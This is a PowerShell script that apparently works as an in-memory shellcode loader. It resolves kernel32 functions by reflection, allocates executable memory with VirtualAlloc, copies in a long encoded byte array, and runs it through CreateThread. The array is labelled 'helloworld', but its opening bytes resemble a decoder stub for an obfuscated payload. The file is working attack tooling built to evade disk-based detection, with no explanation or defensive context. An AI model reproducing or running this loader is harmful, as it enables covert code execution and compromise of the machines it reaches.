function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
    Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
    @($moduleName)), $functionName))
}

function getDelegateType {
    Param (
    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
    [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
    [System.MulticastDelegate])
    $type.
    DefineConstructor('RTSpecialName, HideBySig, Public',
    [System.Reflection.CallingConventions]::Standard, $func).
    SetImplementationFlags('Runtime, Managed')
    $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
    SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

# Allocate executable memory
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), 
  (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $helloworld = 0x48,0x31,0xc0,0x49,0x89,0xe5,0xda,0xc4,0x66,0x41,0x81,0xe5,0xa0,0xf3,0x49,0xf,0xae,0x45,0x0,0x49,0xba,0x21,0xff,0x29,0xaf,0x51,0x7f,0x86,0x4a,0xb0,0x86,0x49,0x8b,0x4d,0x8,0x48,0xff,0xc8,0x4c,0x31,0x54,0xc1,0x2a,0x48,0x85,0xc0,0x75,0xf3,0x69,0xce,0xfb,0xe7,0xd8,0x98,0xcf,0xf0,0x8c,0xda,0x7f,0xb8,0xbf,0xbe,0xbe,0x95,0xfb,0x30,0x4f,0x2e,0xb6,0xaf,0x75,0x2,0x2e,0x51,0x2e,0x1d,0x2e,0x37,0x5,0x8d,0x29,0xb7,0xa2,0xb0,0x19,0x80,0x4c,0x6,0x10,0xab,0xfa,0x8e,0x19,0xfa,0x54,0x3f,0xd2,0x1a,0x3d,0x2b,0x12,0x4a,0x84,0xc0,0x86,0x1a,0xb4,0xfb,0x91,0x4,0x8c,0xb7,0x16,0xab,0xc0,0xb8,0x1e,0xf7,0x6,0xf3,0x1e,0xc2,0xf7,0xb0,0x49,0x3f,0x47,0x3b,0x7d,0x92,0x4,0xb4,0xcd,0xb1,0xf,0x8d,0x34,0x1b,0x3d,0xbd,0x92,0xbf,0xf,0xf7,0x2c,0x27,0xff,0xb3,0x18,0xe4,0xea,0x92,0x96,0x5e,0x89,0x44,0xda,0xd3,0x56,0x18,0x1,0x43,0xa7,0x6a,0xd9,0x35,0x61,0x6c,0xc6,0xeb,0x75,0x8a,0xd9,0xb,0x22,0xb7,0x5e,0x28,0x0,0xf3,0xdd,0x8f,0x84,0xff,0xe9,0x66,0x8d,0xca,0xed,0xed,0x91,0xff,0x93,0x46,0xb5,0x8,0x1,0x14,0x1b,0x29,0xec,0xb,0x2e,0x8c,0xbc,0x52,0xb0,0x58,0xf1,0x2,0x12,0x1,0x92,0xdc,0xf8,0x1e,0x49,0xfe,0xa7,0x73,0x34,0x2d,0xc3,0x84,0xd6,0x48,0xeb,0xe1,0x84,0xdb,0x1f,0xe7,0xcc,0x8,0x96,0x6,0x31,0xfc,0x1b,0x9d,0xec,0x36,0x54,0x22,0xf2,0xef,0xfc,0x3f,0xf8,0xcc,0x76,0xbc,0x8a,0x81,0xbf,0xa8,0x4,0x7f,0x2b,0xbc,0xb6,0xa8,0xce,0xa8,0x6d,0x68,0xe4,0x65,0x6d,0x3d,0xe0,0xe,0x5d,0x9c,0xe0,0xe1,0xd3,0x75,0x57,0x47,0xd0,0xa5,0xc8,0xb8,0xeb,0x75,0x2d,0x5f,0xe8,0x67,0x47,0x7,0xd9,0x32,0xdf,0xb3,0x24,0x1,0xbb,0x4f,0x1b,0x87,0x6e,0xb,0xba,0x50,0xed,0x7,0x6b,0x4,0x4a,0x13,0x63,0x53,0xdb,0x7,0xd1,0x84,0x37,0x13,0x63,0x53,0x9b,0x7,0x55,0x61,0x65,0x11,0xa5,0x30,0x72,0x7,0xd1,0xa4,0x7f,0x13,0xd9,0xc1,0x17,0x73,0x3b,0xaa,0x2d,0x77,0xc8,0x40,0x7a,0x86,0x57,0x97,0x2e,0x9a,0xa,0xec,0xe9,0x7,0xd1,0x84,0xf,0x1a,0xb9,0x8a,0xf9,0x73,0x12,0xd7,0xff,0x3d,0x69,0x79,0xa3,0x44,0x58,0xd9,0xaa,0x29,0xe8,0x1,0xbb,0xc4,0xda,0x5e,0x2f,0x5b,0xe8,0x49,0x3e,0x8f,0x2e,0xb1,0x67,0x5a,0x38,0x8a,0xf3,0x57,0x1e,0x5d,0x6f,0x7b,0xb8,0x48,0xba,0x9f,0xb9,0x80,0x62,0x6a,0x21,0x49,0x44,0x86,0x1b,0x5d,0x1b,0xd3,0xa0,0x0,0x6d,0x7,0x6b,0x16,0x6e,0x9a,0x21,0xc,0x17,0xe,0x5b,0x17,0x17,0xbb,0x9d,0xf0,0xf7,0x4c,0x16,0xf2,0x27,0x1e,0xd1,0xd0,0xce,0x97,0x2,0x92,0xa4,0x1b,0xcc,0x48,0xba,0x9f,0x3c,0x97,0xa4,0x57,0xa0,0x45,0x30,0xf,0x46,0x9f,0x2e,0x8b,0xa9,0x8a,0xbf,0xc7,0x12,0xd7,0xff,0x1a,0xb0,0x40,0xe3,0x11,0x3,0x8c,0x6e,0x3,0xa9,0x58,0xfa,0x15,0x12,0x55,0xc3,0x7b,0xa9,0x53,0x44,0xaf,0x2,0x97,0x76,0x1,0xa0,0x8a,0xa9,0xa6,0x11,0x29,0xd0,0xa4,0xb5,0x49,0x8a,0x94,0x9,0x9f,0x91,0x2c,0x81,0x6f,0xd2,0x21,0x3f,0xa2,0x2f,0x1a,0xbe,0x49,0x32,0xae,0x13,0x11,0xed,0x17,0x9f,0x27,0xbc,0xb0,0x8f,0x85,0x7c,0x13,0x61,0xe0,0xe8,0x15,0x17,0xe7,0xef,0x16,0xd9,0xc8,0xe8,0x1c,0x13,0x6c,0x15,0xd,0x91,0xa6,0xbb,0x4f,0x5a,0xd6,0xd0,0x8e,0x0,0xf,0xbb,0x4f,0x5a,0xe1,0x16,0x75,0xd9,0x30,0x8d,0x61,0x6d,0xe6,0x1,0x69,0xd9,0x37,0xbb,0x15,0x12,0x5f,0xee,0x12,0x2f,0xc1,0x0,0x4e,0x5a,0xd6,0x62,0x6a,0x21,0x52,0xe8,0x25,0x59,0x85,0x66,0xe1,0xbf,0x88,0x24,0x89,0x5a,0xd6,0x2f,0x5b,0x17,0xd4,0x53,0xb5,0x5a,0xd6,0x2f,0x74,0xa7,0x42,0xe1,0x2b,0x6d,0x89,0x7a,0x19,0xdc,0x67,0xd1,0x1d,0x6e,0xef,0x6b,0x33,0x9c,0x74,0xe9,0x7e,0x62,0x87,0x18,0x16,0xa6,0x47,0xd7,0x2b,0x34,0x9d,0x6c,0x32,0xd9,0x7b,0xda,0x0,0x3e,0xe5,0x5e,0x34,0xdc,0x64,0x8a,0x2c,0x35,0xb9,0x66,0x68,0x9d,0x57,0x8e,0x7a,0x6d,0x83,0x47,0x39,0x9e,0x65,0xee,0x0,0x36,0xac,0x7a,0x13,0xa9,0x45,0xfd,0x0,0x6b,0x93,0x7e,0x3c,0x8e,0x62,0xc9,0x17,0x1f,0x93,0x6c,0x17,0xa7,0x55,0x8b,0x2d,0x69,0x99,0x7e,0x1c,0xaf,0x33,0xde,0x22,0xc,0x80,0x4e,0x3,0x87,0x42,0x8f,0x2b,0x18,0x87,0x46,0x2d,0xb0,0x33,0xe4,0x3f,0x63,0x80,0x75,0xf,0xba,0x64,0xc1,0x7d,0x63,0x89,0x55,0x1d,0x8b,0x47,0x8d,0x5,0x37,0x9a,0x2,0x36,0xad,0x31,0xce,0x22,0x6a,0x9b,0x77,0x1d,0x87,0x5b,0xe4,0x18,0x33,0x99,0x69,0x2d,0x9e,0x75,0xf2,0x37,0x1f,0x90,0x49,0x6d,0xc5,0x30,0xcb,0x28,0x3c,0x83,0x63,0x35,0x8a,0x62,0xf1,0x2d,0xa,0xae,0x6d,0x14,0x98,0x56,0xed,0x5,0xd,0xe3,0x58,0x6c,0xa2,0x4a,0xd3,0x23,0x35,0x95,0x5c,0x32,0xdf,0x71,0xf3,0x39,0x62,0xa4,0x43,0x3c,0x8d,0x38,0xeb,0x2,0x5,0xfb,0x59,0x2d,0xbb,0x4a,0xd6,0x7,0x6a,0xa6,0x5e,0x22,0xa9,0x56,0x8c,0x1,0x23,0x8f,0x6b,0x28,0xd1,0x42,0xc9,0x37,0x33,0x91,0x42,0x39,0x98,0x6f,0xc1,0x62,0x63,0xba,0x61,0x6b,0xdd,0x78,0xfa,0x36,0x6f,0x94,0x5c,0x2d,0x9b,0x75,0xff,0x2a,0x20,0x97,0x4e,0x2a,0xe8,0x49,0x32,0x8e,0x9,0x8c,0x6e,0x3,0xa5,0x30,0x72,0x1c,0x12,0x6e,0x2f,0x69,0x40,0x85,0xbb,0x4f,0x5a,0xd6,0x7f,0x8,0xbb,0x48,0x7c,0x8d,0xb1,0x83,0x1,0x60,0x17,0xd4,0xf3,0xc6,0x9c,0xbc,0x25,0x4,0xa0,0x88,0x4a,0x25,0x45,0x8c,0x7d,0x33,0x68,0x32,0xbb,0x4f,0x13,0x5f,0xcf,0x31,0xec,0x40,0xe2,0x6,0xe0,0xa3,0x69,0xc5,0x6e,0x1,0xbb,0x4f,0x5a,0x29,0xfa,0x16,0xd9,0xc1,0xe8,0x15,0x12,0x5f,0xde,0x16,0xd9,0xc8,0xf6,0x7e,0x93,0x85,0x7c,0x12,0x2f,0xc3,0x96,0x49,0x42,0xad,0xd0,0x8e,0x6d,0xc1,0xce,0x50,0x12,0x11,0xee,0xd3,0xfb,0x1,0xbb,0x6,0xe0,0x92,0xdf,0x6e,0x8,0x1,0xbb,0x4f,0x5a,0x29,0xfa,0x13,0x17,0xce,0xcf,0x4d,0xb1,0x7c,0xc7,0xe,0xe8,0x1,0xbb,0x1c,0x3,0xbc,0x6f,0x1,0xa1,0x88,0x6a,0x8e,0xb8,0xc6,0x66,0x9c,0x28,0x1,0xab,0x4f,0x5a,0x9f,0x95,0x3,0x4c,0x52,0x5e,0x4f,0x5a,0xd6,0x2f,0xa4,0x3d,0x49,0x28,0x1c,0x9,0x9e,0xa6,0xbc,0xa0,0x88,0x4a,0x7,0xd3,0xc,0x66,0x9c,0x28,0x1,0x9b,0x4f,0x5a,0x9f,0xa6,0xa2,0xa1,0xbb,0xa9,0xd9,0xd3,0x34,0x2f,0x5b,0xe8,0x1,0x44,0x9a,0x12,0x55,0xeb,0x7b,0x6d,0xc1,0xcf,0xfd,0x3c,0x5d,0x28,0x13,0xe9,0xc2,0x3e,0x8f,0x2f,0x4,0x77,0x98,0xb0,0x6b,0xbb,0x16,0x13,0x11,0xed,0xab,0x5d,0xa3,0xed,0xb0,0x8f,0x66,0x9c,0x19,0xab,0x92,0xef,0x45,0x2b,0xbf,0x25,0x6,0x86,0xed,0x58,0xed,0x43,0x26,0xd,0xc0,0x67,0x40,0x97,0xe6,0x1b,0x53,0x30,0xb6

[System.Runtime.InteropServices.Marshal]::Copy($helloworld, 0, $lpMem, $helloworld.length)

# Execute
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread),
  (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject),
  (getDelegateType @([IntPtr], [Int32])([Int]))).Invoke($hThread, 0xFFFFFFFF)
